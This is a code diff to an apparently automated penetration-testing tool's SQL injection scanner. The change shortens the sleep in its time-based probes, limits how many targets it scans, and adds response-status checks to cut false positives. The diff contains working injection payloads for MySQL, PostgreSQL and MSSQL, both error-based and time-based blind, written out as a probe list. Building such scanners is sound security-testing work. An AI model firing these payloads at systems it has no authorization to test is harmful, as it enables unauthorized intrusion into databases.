@@ -35,15 +35,15 @@ DBMS_ERROR_PATTERNS = [
 ]
 
 SQLI_PROBES = [
-    # Error-based
+    # Error-based (fast — run first)
     {"payload": "'", "type": "error_based", "desc": "Single Quote SQL Syntax Error"},
     {"payload": "1' AND ExtractValue(1, CONCAT(0x5c, 'penflow_sqli'))--", "marker": "penflow_sqli", "type": "error_based", "desc": "ExtractValue XML Error Injection"},
     {"payload": "1' AND 1=CONVERT(int, (SELECT 'penflow_sqli'))--", "marker": "penflow_sqli", "type": "error_based", "desc": "MSSQL Convert Error Injection"},
 
-    # Time-based blind
-    {"payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--", "sleep": 3, "type": "time_based_mysql", "desc": "MySQL Time-Based Sleep"},
-    {"payload": "1'; SELECT pg_sleep(3);--", "sleep": 3, "type": "time_based_postgres", "desc": "PostgreSQL Time-Based Sleep"},
-    {"payload": "1'; WAITFOR DELAY '0:0:3';--", "sleep": 3, "type": "time_based_mssql", "desc": "MSSQL WAITFOR DELAY"},
+    # Time-based blind — 2s sleep (reduced from 3s to stay within timeout budget)
+    {"payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--", "sleep": 2, "type": "time_based_mysql", "desc": "MySQL Time-Based Sleep"},
+    {"payload": "1'; SELECT pg_sleep(2);--", "sleep": 2, "type": "time_based_postgres", "desc": "PostgreSQL Time-Based Sleep"},
+    {"payload": "1'; WAITFOR DELAY '0:0:2';--", "sleep": 2, "type": "time_based_mssql", "desc": "MSSQL WAITFOR DELAY"},
 ]
 
 
@@ -74,7 +74,10 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
         findings: List[Dict[str, Any]] = []
         evidence: Dict[str, Any] = {}
 
-        for target in candidate_targets[:8]:
+        # Budget: 4 targets × (1 baseline + 3 error probes) ≈ 16 fast requests first.
+        # If no error-based found, run time-based: 4 targets × 3 probes × 2s = ~24s max.
+        # Total well within 120s HEAVY_TIMEOUT budget.
+        for target in candidate_targets[:4]:
             base_url = target["url"]
             param = target["param"]
             parsed = urllib.parse.urlparse(base_url)
@@ -89,7 +92,9 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                 )
                 t_base = time.time() - t_start
                 resp_base = exch_base.response
-                base_text = (resp_base.body_text or "").lower() if resp_base else ""
+                if not resp_base or resp_base.status_code not in (200, 201, 202, 204, 301, 302, 307, 308):
+                    continue
+                base_text = (resp_base.body_text or "").lower()
             except Exception as e:
                 logger.debug(f"[{self.name}] Baseline request failed on {base_url}: {e}")
                 continue
@@ -115,9 +120,10 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                         resp_sleep = exch_sleep.response
 
                         # 3-Phase Differential Timing Verification:
-                        # 1. Check if elapsed time exceeded sleep duration (with baseline buffer)
-                        # 2. Send negative non-sleep request to ensure server isn't just universally lagging
-                        if resp_sleep and elapsed_sleep >= (t_base + sleep_time - 0.5):
+                        # 1. Delay MUST occur on a valid 2xx response (NOT on 400, 404, 405, 5xx errors!)
+                        # 2. Check if elapsed time exceeded sleep duration (with baseline buffer)
+                        # 3. Send negative non-sleep request to ensure server isn't just universally lagging
+                        if resp_sleep and resp_sleep.status_code in (200, 201, 202, 204, 301, 302, 307, 308) and elapsed_sleep >= (t_base + sleep_time - 0.5):
                             # Verification Phase: Send normal non-sleep request
                             t_verify_start = time.time()
                             exch_verify = await http_client.send_as_identity(
